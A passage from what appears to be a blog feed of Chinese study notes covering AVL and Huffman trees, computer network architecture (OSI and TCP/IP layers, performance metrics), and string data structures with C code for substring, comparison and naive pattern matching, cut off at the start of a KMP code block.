title="查找效率计算"></a>查找效率计算</h6></li></ul><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%83/56.jpg" style="zoom:80%;" /></center><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%83/57.jpg" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="20-平衡二叉树"><a href="#20-平衡二叉树" class="headerlink" title="20.平衡二叉树"></a>20.平衡二叉树</h4><ul><li><h4 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h4></li></ul><p>&emsp;&emsp;平衡二叉树，简称平衡树（AVL树）——树上任一结点的左子树和右子树的高度之差不超过1</p><p>&emsp;&emsp;结点的平衡因子=左子树高-右子树高</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//平衡二叉树结点</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">AVLNode</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">int</span> key;<br>    <span class="hljs-type">int</span> balance;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">AVLNode</span> *<span class="hljs-title">lchild</span>,*<span class="hljs-title">rchild</span>;</span><br>&#125;AVLNode,*AVLTree;<br></code></pre></td></tr></table></figure><ul><li><h6 id="平衡二叉树的插入"><a href="#平衡二叉树的插入" class="headerlink" title="平衡二叉树的插入"></a>平衡二叉树的插入</h6></li></ul><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%83/58.jpg" style="zoom:80%;" /></center><ul><li><h6 id="调制不平衡树的四种情况"><a href="#调制不平衡树的四种情况" class="headerlink" title="调制不平衡树的四种情况"></a>调制不平衡树的四种情况</h6></li></ul><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%83/59.jpg" style="zoom:80%;" /></center><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%83/60.jpg" style="zoom:80%;" /></center><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%83/62.jpg" style="zoom:80%;" /></center><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%83/63.jpg" style="zoom:80%;" /></center><ul><li><h6 id="查找效率分析"><a href="#查找效率分析" class="headerlink" title="查找效率分析"></a>查找效率分析</h6></li></ul><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%83/64.jpg" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="21-哈夫曼树"><a href="#21-哈夫曼树" class="headerlink" title="21.哈夫曼树"></a>21.哈夫曼树</h4><ul><li><h6 id="带权路径长度"><a href="#带权路径长度" class="headerlink" title="带权路径长度"></a>带权路径长度</h6></li></ul><p>&emsp;&emsp;结点的权：有某种现实含义的数值</p><p>&emsp;&emsp;接单的带权路径长度：从树的根到该结点的路径长度（经过的边数）与该接单上权值的乘积</p><p>&emsp;&emsp;树的带权路径长度：树中所有叶接单的带权路径长度之和（WPL）</p><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%83/65.jpg" style="zoom:80%;" /></center><ul><li><h6 id="哈夫曼树的定义"><a href="#哈夫曼树的定义" class="headerlink" title="哈夫曼树的定义"></a>哈夫曼树的定义</h6></li></ul><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%83/66.jpg" style="zoom:80%;" /></center><p>&emsp;&emsp;在含有n个带权叶结点的二叉树中，其中带权路径长度（WPL）最小的二叉树称为哈夫曼树，也称为最优二叉树，是图中红色框出的部分</p><ul><li><h6 id="哈夫曼树的构造"><a href="#哈夫曼树的构造" class="headerlink" title="哈夫曼树的构造"></a>哈夫曼树的构造</h6></li></ul><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%83/67.jpg" style="zoom:80%;" /></center><ul><li><h6 id="哈夫曼编码"><a href="#哈夫曼编码" class="headerlink" title="哈夫曼编码"></a>哈夫曼编码</h6></li></ul><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%83/68.jpg" style="zoom:80%;" /></center><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%83/69.jpg" style="zoom:80%;" /></center><ul><li><h6 id="编码类型"><a href="#编码类型" class="headerlink" title="编码类型"></a>编码类型</h6></li></ul><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%83/70.jpg" style="zoom:80%;" /></center><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%83/71.jpg" style="zoom:80%;" /></center>]]></content>
    
    
    <categories>
      
      <category>数据结构学习笔记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>计算机网络体系结构</title>
    <link href="/2022/10/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%BA%8C/"/>
    <url>/2022/10/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%BA%8C/</url>
    
    <content type="html"><![CDATA[<h1 id="计算机网络体系结构"><a href="#计算机网络体系结构" class="headerlink" title="计算机网络体系结构"></a>计算机网络体系结构</h1><h4 id="1-计算机网络概述"><a href="#1-计算机网络概述" class="headerlink" title="1.计算机网络概述"></a>1.计算机网络概述</h4><ul><li>概念</li></ul><p>&emsp;&emsp;计算机网络是一个将分散的、具有独立功能的计算机系统，通过<strong>通信设备与线路</strong>连接起来，由功能完善的<strong>软件</strong>实现资源共享和信息传递的系统，是互连的、自治的计算机集合</p><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%BA%8C/1.jpg" style="zoom:80%;" /></center><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%BA%8C/2.jpg" style="zoom:80%;" /></center><ul><li>功能</li></ul><p>&emsp;&emsp;同一个计算机网络上的其他计算机可使用某台计算机的计算机资源的行为，可共享硬件、软件、数据。功能包括了<strong>数据通信、资源共享</strong>、分布式处理(可靠性和负载均衡）等</p><ul><li>多层次ISP结构</li></ul><p>&emsp;&emsp;因特网服务提供者/因特网 服务提供商，是一个向广大用户 综合提供互联网接入业务、信息 业务、和增值业务的公司，如中国电信、中国联动、中国移动等。分为主干ISP、地区ISP和本地ISP。</p><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%BA%8C/3.jpg" style="zoom:80%;" /></center>&emsp;<h4 id="2计算机网络的组成"><a href="#2计算机网络的组成" class="headerlink" title="2计算机网络的组成"></a>2计算机网络的组成</h4><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%BA%8C/4.png" style="zoom:80%;" /></center><p>&emsp;&emsp;其中在七层结构中，资源网包含了应用层、表示层、会话层，而通信子网包含了网络层、数据链路层和物理层。</p><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%BA%8C/5.jpg" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="3-计算机网络的分类"><a href="#3-计算机网络的分类" class="headerlink" title="3.计算机网络的分类"></a>3.计算机网络的分类</h4><ul><li>按分布范围</li></ul><p>&emsp;&emsp;广域网WAN（交换技术）、城域网MAN、局域网LAN（广播技术）、个人区域网PAN</p><ul><li>按使用者</li></ul><p>&emsp;&emsp;公用网、专用网</p><ul><li>按交换技术</li></ul><p>&emsp;&emsp;电路交换、报文交换、分组交换</p><ul><li>按拓扑结构</li></ul><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%BA%8C/6.png" style="zoom:60%;" /></center><ul><li>按传输技术</li></ul><p>&emsp;&emsp;广播式网络（共享公共通信信道）、点对点网络（使用分组存储转发和路由选择机制）</p><p>&emsp;</p><h4 id="5-标准化工作及相关知识（非重点）"><a href="#5-标准化工作及相关知识（非重点）" class="headerlink" title="5.标准化工作及相关知识（非重点）"></a>5.标准化工作及相关知识（非重点）</h4><p>&emsp;为了首先不同厂商的软件、硬件之间相互连通，所以建立了统一的标准</p><ul><li>法定标准</li></ul><p>&emsp;&emsp;由权威机构制定的正式的、合法的标准。例如：OSI</p><ul><li>事实标准</li></ul><p>&emsp;&emsp;某公司的产品在竞争中占据了主流，经过时间，这些产品中的协议和技术就成了标准。例如：TCP/IP</p><ul><li>RFC建立阶段</li></ul><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%BA%8C/7.jpg" style="zoom:60%;" /></center><p>&emsp;</p><h4 id="6-计算机网络性能指标（一）"><a href="#6-计算机网络性能指标（一）" class="headerlink" title="6.计算机网络性能指标（一）"></a>6.计算机网络性能指标（一）</h4><ul><li>速率</li></ul><p>&emsp;&emsp;速率即数据率或称数据传输率或比特率，是指连接在计算机网络上的主机在数字信道上传送数据位数的速率。单位：b/s  kb/s   Mb/s  Gb/s  Tb/s</p><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%BA%8C/7.png" style="zoom:60%;" /></center><ul><li>带宽</li></ul><p>&emsp;&emsp;带宽原本是指某个信号具有的频带宽度，即最高频率与最低频率之差，单位是赫兹（Hz），而在计算网络中，带宽是用来表示网络的通信线路传送数据的能力，通常是指单位时间内超平面网络中的某一点到另有点所能通过的“最高数据率”。单位是“比特每秒”。单位：b/s  kb/s   Mb/s  Gb/s  （发送的量，而不是传输的量）</p><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%BA%8C/8.jpg" style="zoom:60%;" /></center><ul><li>吞吐量</li></ul><p>&emsp;&emsp;吞吐量表示在单位时间内通过某个网络（或信道、接口）的数量。单位：b/s  kb/s   ；吞吐量受网络的带宽或网络的额定速率的限制</p><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%BA%8C/9.jpg" style="zoom:60%;" /></center><p>&emsp;&emsp;可以看见，带宽的理论的最大值，但是并不一定是实际的吞吐量，实际的吞吐量是所有的链路速率相加，在不超过最大的理想带宽的情况下。</p><p>&emsp;</p><h4 id="6-计算机网络性能指标（二）"><a href="#6-计算机网络性能指标（二）" class="headerlink" title="6.计算机网络性能指标（二）"></a>6.计算机网络性能指标（二）</h4><ul><li>时延</li></ul><p>&emsp;&emsp;时延是指数据（报文/分组/比特；流）从网络（或链路）的一端传送到另一端所需时间，也叫延迟或迟延。</p><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%BA%8C/10.jpg" style="zoom:60%;" /></center><ul><li>时延带宽积</li></ul><p>&emsp;&emsp;时延带宽积=传播时延×带宽，时延带宽积又称为以比特为单位的链路长度。 即“某段链路现在有多少比特”。</p><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%BA%8C/11.jpg" style="zoom:60%;" /></center><ul><li>往返时延（RTT）</li></ul><p>&emsp;&emsp;往返时延是指从发送方发送数据开始，到发送方收到接收方确认（接收方收到数据后立即发送确认），总共经历的时延，一般而言，末端处理事件会比较小或者题目会提示忽略不计</p><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%BA%8C/12.jpg" style="zoom:60%;" /></center><ul><li>利用率</li></ul><p>&emsp;&emsp;信道利用率为考察重点</p><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%BA%8C/13.jpg" style="zoom:60%;" /></center><p>&emsp;</p><h4 id="7-分层内容"><a href="#7-分层内容" class="headerlink" title="7.分层内容"></a>7.分层内容</h4><ul><li>如何分层</li></ul><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%BA%8C/14.jpg" style="zoom:80%;" /></center><ul><li>结构展示</li></ul><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%BA%8C/15.jpg" style="zoom:100%;" /></center><p>&emsp;</p><h4 id="8-分层结构"><a href="#8-分层结构" class="headerlink" title="8.分层结构"></a>8.分层结构</h4><p>&emsp;&emsp;计算机网络分层结构算法主要为两种：一种是法定标准为OSI参考模型，一种是事实标准为TCP/IP参考模型</p><ul><li>OSI模型</li></ul><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%BA%8C/16.jpg" style="zoom:100%;" /></center><ul><li>TCP/IP</li></ul><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%BA%8C/20.jpg" style="zoom:100%;" /></center><p>&emsp;</p><h4 id="9-OSI模型"><a href="#9-OSI模型" class="headerlink" title="9.OSI模型"></a>9.OSI模型</h4><ul><li>通信过程</li></ul> <center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%BA%8C/17.jpg" style="zoom:100%;" /></center> <center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%BA%8C/18.jpg" style="zoom:100%;" /></center><ul><li><h6 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h6></li></ul><p>&emsp;&emsp;所有能和用户交互产生网络流量的程序</p><ul><li><h6 id="表示层"><a href="#表示层" class="headerlink" title="表示层"></a>表示层</h6></li></ul><p>&emsp;&emsp;用于处理再两个通信系统中交换信息的表示方式（语法和语义）；</p><p>&emsp;&emsp;功能一：数据格式变换</p><p>&emsp;&emsp;功能二：数据加密解密</p><p>&emsp;&emsp;功能三：数据压缩和恢复</p><ul><li><h6 id="会话层"><a href="#会话层" class="headerlink" title="会话层"></a>会话层</h6></li></ul><p>&emsp;&emsp;向表示层实体/用户进程提供建立连接并在连接上有序地传输数据，这是会话，也是建立同步（SYN）；主要协议有ADSP、ASP</p><p>&emsp;&emsp;功能一：建立、管理、终止会话</p><p>&emsp;&emsp;功能二：使用校验点可使会话在通信失效时从校验点/同步点继续恢复通信，实现数据同步</p><ul><li><h6 id="传输层"><a href="#传输层" class="headerlink" title="传输层"></a>传输层</h6></li></ul><p>&emsp;&emsp;负责主机中两个进程的通信，即端到端的通信。传输单位是报文段或者用户数据报；主要协议有TCP、UDP</p><p>&emsp;&emsp;功能一：可靠传输、不可靠传输</p><p>&emsp;&emsp;功能二：差错控制</p><p>&emsp;&emsp;功能三：流量控制</p><p>&emsp;&emsp;功能四：复用分用  </p><ul><li><h6 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h6></li></ul><p>&emsp;&ensp;主要任务是吧分组从源端传到目的端，为分组交换网上的不同主机提供通信服务。网络层传输单位是数据报；主要协议有IP、IPX、ICMP、IGMP、ARP、RARP、OSPF</p><p>&emsp;&emsp;功能一：路由选择</p><p>&emsp;&emsp;功能二：流量控制</p><p>&emsp;&emsp;功能三：差错控制</p><p>&emsp;&emsp;功能四：拥塞控制</p><ul><li>数据链路层</li></ul><p>&emsp;&emsp;主要任务是把网路层传下来的数据报组装成帧，也就是其传输的传输单位；主要协议有SDLC、HDLC、PPP、STP</p><p>&emsp;&emsp;功能一：成帧</p><p>&emsp;&emsp;功能二：差错控制（检错+纠错）</p><p>&emsp;&emsp;功能三：流量控制</p><p>&emsp;&emsp;功能四：访问（接入）控制 </p><ul><li>物理层</li></ul><p>&emsp;&emsp;主要任务是在物理媒体上实现比特流的透明传输，透明传输是指不管所传数据是什么样的比特组合，第应当能够在链路上传送</p><p>&emsp;&emsp;功能一：定义接口特性</p><p>&emsp;&emsp;功能二：定义传输模式（单工、半双工、双工）</p><p>&emsp;&emsp;功能三：定义传输速率</p><p>&emsp;&emsp;功能四：比特同步</p><p>&emsp;&emsp;功能五：比特编码</p><p>&emsp;</p><h4 id="10-TCP-IP模型"><a href="#10-TCP-IP模型" class="headerlink" title="10.TCP/IP模型"></a>10.TCP/IP模型</h4><p>&emsp;&emsp;该模型为四层模型，</p><ul><li>应用层</li></ul><p>&emsp;&emsp;TCP/IP的分层中，将OSI参考模型中的会话层、表示层和应用层的功能都集中到了应用程序中实现。TCP/IP应用的架构绝大多数属于客户端/服务器模型。）</p><ul><li>传输层</li></ul><p>&emsp;&emsp;与OSI模型类似</p><ul><li>网际层</li></ul><p>&emsp;&emsp;用来处理网络上流动的数据包（网络传输中最小的数据单元），规定了怎样的路径把数据包传输到目标计算机，并把数据包传送给对方。（与tcp/ip协议密切相关的有IP协议、ARP协议、RARP协议）。IP协议就在这里，它负责对数据加上IP地址和其他的数据（后面会讲到）以确定传输的目标。</p><ul><li>网络接口层</li></ul><p>&emsp;&emsp;TCP/IP软件的最底层，负责接收IP数据报并通过网络发送之，或者从网络上接收物理帧，抽出IP数据报，交给IP层。</p><p>&emsp;</p><h4 id="11-两种模型区别"><a href="#11-两种模型区别" class="headerlink" title="11.两种模型区别"></a>11.两种模型区别</h4> <center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%BA%8C/21.jpg" style="zoom:100%;" /></center><p>&emsp;</p><h4 id="12-更优解——5层参考模型"><a href="#12-更优解——5层参考模型" class="headerlink" title="12. 更优解——5层参考模型"></a>12. 更优解——5层参考模型</h4><p>&emsp;&emsp;5层参考模型综合了OSI和TCP/IP的优点，更好的应用到了实际当中</p> <center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%BA%8C/22.jpg" style="zoom:100%;" /></center> <center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%BA%8C/23.jpg" style="zoom:100%;" /></center>]]></content>
    
    
    <categories>
      
      <category>计算机网络学习笔记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>串</title>
    <link href="/2022/10/21/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%85%AD/"/>
    <url>/2022/10/21/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%85%AD/</url>
    
    <content type="html"><![CDATA[<h1 id="串"><a href="#串" class="headerlink" title="串"></a>串</h1><h4 id="1-定义"><a href="#1-定义" class="headerlink" title="1.定义"></a>1.定义</h4><ul><li>串</li></ul><p>&emsp;&emsp;即是字符串，是由零个或者多个字符组成的有限序列。一般记为S=‘a1a2a3…an’(n≥0)。其中S是串名，单引号括起来的字符序列是串的值，其中ai可以是字母、数字或其他字符。</p><p>&emsp;&emsp;实际上，串是一种特殊的线性表，数据元素之间呈线性关系，只不过，串的数据对象限制为了字符集（中文字符、英文字符、数字字符、标点字符等），二串的基本操作，如增删改查等通常也是以子串作为操作对象。</p><ul><li>子串</li></ul><p>&emsp;&emsp;串中任意个连续的字符组成的子序列</p><ul><li>主串</li></ul><p>&emsp;&emsp;包含子串的串</p><ul><li>字符在主串中的位置</li></ul><p>&emsp;&emsp;字符在串中的序号</p><ul><li>子串在主串中的位置</li></ul><p>&emsp;&emsp;子串的第一个字符在主串中的位置</p><p>&emsp;</p><h4 id="2-串的基本操作"><a href="#2-串的基本操作" class="headerlink" title="2.串的基本操作"></a>2.串的基本操作</h4><ul><li>StrAssign(&amp;T,chars)；赋值操作，把串T赋值为chars</li><li>StrCopy(&amp;T,S)；复制操作， 把串S复制得到串T</li><li>StrEmpty(S)；判空操作，若S为空串则返回TRUE，否则返回FALSE</li><li>StrLength(S)：求串长，返回串S的元素个数</li><li>ClearString(&amp;S)：清空操作，将S清为空串</li><li>DestroyString(&amp;S)：销毁串，将串S销毁并且回收存储空间</li><li>Concat(&amp;T,S1,S2)：串联接，用T返回S1和S2联接而成的新串</li><li>SubString(&amp;Sub,S,pos,len)：求子串。用Sub返回串S的第pos个字符起长度为len的子串</li><li>Index(S,T)：定位操作，若主串S存在于串T值相同的子串，则返回它在主串S中第一次出现的位置；否则函数值为0</li><li>StrCompare(S,T)：比较操作，若S&gt;T，则返回值&gt;0，若S=T，则返回值=0，若S&lt;T，则返回值&lt;0，</li></ul><p>&emsp;</p><h4 id="3-串的存储结构"><a href="#3-串的存储结构" class="headerlink" title="3.串的存储结构"></a>3.串的存储结构</h4><ul><li>顺序存储</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//静态数组实现</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAXLEN 255</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">char</span> ch[MAXLEN];<br>    <span class="hljs-type">int</span> length;<br>&#125;SString;<br><br><span class="hljs-comment">//动态数组实现</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">char</span> *ch;<br>    <span class="hljs-type">int</span> length;<br>&#125;HString;<br>HString S;<br>S.ch = (<span class="hljs-type">char</span> *)<span class="hljs-built_in">malloc</span>(MAXLEN * <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">char</span>));<span class="hljs-comment">//用完需要手动free</span><br>S。length = <span class="hljs-number">0</span>;<br></code></pre></td></tr></table></figure><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%85%AD/1.jpg" style="zoom:80%;" /></center><ul><li>链式存储</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">StringNode</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">char</span> ch;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">StringNode</span> *<span class="hljs-title">next</span>;</span><br>&#125;StringNode,*String;<br></code></pre></td></tr></table></figure><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%85%AD/2.jpg" style="zoom:80%;" /></center><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">StringNode</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">char</span> ch[<span class="hljs-number">4</span>];<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">StringNode</span> *<span class="hljs-title">next</span>;</span><br>&#125;StringNode,* String;<br></code></pre></td></tr></table></figure><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%85%AD/3.jpg" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="4-串的基本操作"><a href="#4-串的基本操作" class="headerlink" title="4.串的基本操作"></a>4.串的基本操作</h4><ul><li>求子串SubString(&amp;Sub,S,pos,len)</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">bool</span> <span class="hljs-title function_">SubString</span><span class="hljs-params">(SString &amp;Sub,SString S,<span class="hljs-type">int</span> pos,<span class="hljs-type">int</span> len)</span><br>&#123;<br>   <span class="hljs-keyword">if</span>(pos+len<span class="hljs-number">-1</span>&gt;S.length)<br>       <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=pos;i&lt;pos+len;i++)<br>        Sub.ch[i-pos+<span class="hljs-number">1</span>]  = S.ch[i];<br>    Sub.length = len;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br>    <br></code></pre></td></tr></table></figure><ul><li>比较串的大小StrCompare(S,T)</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">int</span> <span class="hljs-title function_">StrCompare</span><span class="hljs-params">(SString S,SString T)</span><br>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=S.length&amp;&amp;i&lt;=T.length;i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(S.ch[i]!=T.ch[i])<br>            retuen S.ch[i]-T.ch[i];<br>    &#125;<br>    <span class="hljs-keyword">return</span> S.length-T.length;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>定位Index(S,T)</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">Index</span><span class="hljs-params">(SString S,SString T)</span><br>&#123;<br>    <span class="hljs-type">int</span> i=<span class="hljs-number">1</span>,n=StrLength,m=StrLength(T);<br>    SString sub;<br>    <span class="hljs-keyword">while</span>(i&lt;=n-m+<span class="hljs-number">1</span>)<br>    &#123;<br>        SubString(sub,S,i,m);<br>        <span class="hljs-keyword">if</span>(StrCompare(sub,T)!=<span class="hljs-number">0</span>)<br>            ++i;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> i;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>&emsp;</p><h4 id="5-串的应用——朴素模式匹配算法"><a href="#5-串的应用——朴素模式匹配算法" class="headerlink" title="5.串的应用——朴素模式匹配算法"></a>5.串的应用——朴素模式匹配算法</h4><ul><li>模式串</li></ul><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%85%AD/4.jpg" style="zoom:80%;" /></center><ul><li>朴素模式匹配算法定义</li></ul><p>&emsp;&emsp;将主串中所有长度为m的子串依次与模式串对比，直到找到一个完全匹配的子串，或所有的子串都不匹配为止</p><ul><li>数组实现</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">Index</span><span class="hljs-params">(SString S,SString T)</span><br>&#123;<br>    <span class="hljs-type">int</span> i=<span class="hljs-number">1</span>,j=<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">while</span>(i&lt;=Slength&amp;&amp;j&lt;=T.length)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(S.ch[i]==T.ch[j])<br>        &#123;<br>            ++i;<br>            ++j;<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            i=i-j+<span class="hljs-number">2</span>;<br>            j=<span class="hljs-number">1</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(j&gt;T.length)<br>        <span class="hljs-keyword">return</span> i-T.length;<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>&emsp;&emsp;朴素模式匹配算法的最坏时间复杂度为O(mn)</p><p>&emsp;</p><h4 id="6-串的应用——KMP匹配算法"><a href="#6-串的应用——KMP匹配算法" class="headerlink" title="6.串的应用——KMP匹配算法"></a>6.串的应用——KMP匹配算法</h4><ul><li>KMP算法实现</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 